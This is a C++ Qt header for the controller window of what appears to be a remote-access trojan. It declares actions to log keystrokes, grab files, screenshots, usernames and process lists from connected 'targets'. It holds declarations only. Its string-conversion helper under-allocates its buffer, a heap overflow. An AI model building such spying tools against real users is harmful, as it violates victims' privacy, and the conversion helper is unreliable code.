/*
author: Forec
last edit date: 2016/09/15
email: forec@bupt.edu.cn
LICENSE
Copyright (c) 2015-2017, Forec <forec@bupt.edu.cn>

Permission to use, copy, modify, and/or distribute this code for any
purpose with or without fee is hereby granted, provided that the above
copyright notice and this permission notice appear in all copies.

THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/

#ifndef MAINWINDOW_H
#define MAINWINDOW_H

#include <QMainWindow>
#include <QApplication>
#include <QMessageBox>
#include <QTextCodec>
#include <QFile>
#include <QtSql/QSqlDatabase>
#include <QtSql>
#include "ui_mainwindow.h"
#include "connect.h"
#include <windows.h>
#include <stdlib.h>
#include <process.h>

namespace Ui {
class MainWindow;
}

class MainWindow : public QMainWindow
{
    Q_OBJECT

public:
    explicit MainWindow(QWidget *parent = 0);
    Ui::MainWindow * getUI(){
        return ui;
    }
    void insert_log(const QString &log);

    ~MainWindow();

private slots:
    void on_tableWidget_customContextMenuRequested(const QPoint &pos);
    void disconnectL();
    void connectL();
    void setIP();
    void addmem();
    void getkeyboard();
    void getfile();
    void getusername();
    void getpslist();
    void getscreenshot();
    void viewhistory();
    void deleteL();

    void on_pushButton_2_clicked();


    void on_tableWidget_itemChanged(QTableWidgetItem *item);

    void on_lineEdit_returnPressed();

    void on_pushButton_4_pressed();

    void on_pushButton_clicked();

private:
    Ui::MainWindow *ui;
    QMenu *popMenu;
    QAction *connect_action;
    QAction *disconnect_action;
    QAction *setip_action;
    QAction *addmem_action;
    //QAction *getcmd_action;
    QAction *getfile_action;
    QAction *getusername_action;
    QAction *getkeyboard_action;
    QAction *getpslist_action;
    QAction *getscreenshot_action;
    QAction *viewhistory_action;
    QAction *delete_action;

    QSqlDatabase db;
    QSqlQuery query;
    QString tempIP;

    target cur_target;
    SOCKET sclient;
    QTableWidgetItem *cur_item;


    bool isInitial;
    char buf[BUFLEN];

    bool checkLive();
    void getcmd();
};

void alert_error(const QString &);
void alert_info(const QString &);
bool alert_check(const QString &);

struct param{
    bool active;
    int row;
    QString name;
    QString ip;
};

unsigned int __stdcall refreshThread(void* pM);

inline QString GBK2UTF8(const QString &inStr)
{
    QTextCodec *gbk = QTextCodec::codecForName("GB18030");
    QString g2u = gbk->toUnicode(gbk->fromUnicode(inStr));              // gbk  convert utf8
    return g2u;
}

inline QString UTF82GBK(const QString &inStr)
{
    QTextCodec *gbk = QTextCodec::codecForName("GB18030");
    QString utf2gbk = gbk->toUnicode(inStr.toLocal8Bit());
    return utf2gbk;
}

inline LPCWSTR stringToLPCWSTR(std::string orig){
    size_t origsize = orig.length() + 1;
    size_t convertedChars = 0;
    wchar_t *wcstring = (wchar_t *)malloc(sizeof(wchar_t)*(orig.length()-1));
    mbstowcs_s(&convertedChars, wcstring, origsize, orig.c_str(), _TRUNCATE);
    return wcstring;
}

#endif // MAINWINDOW_H
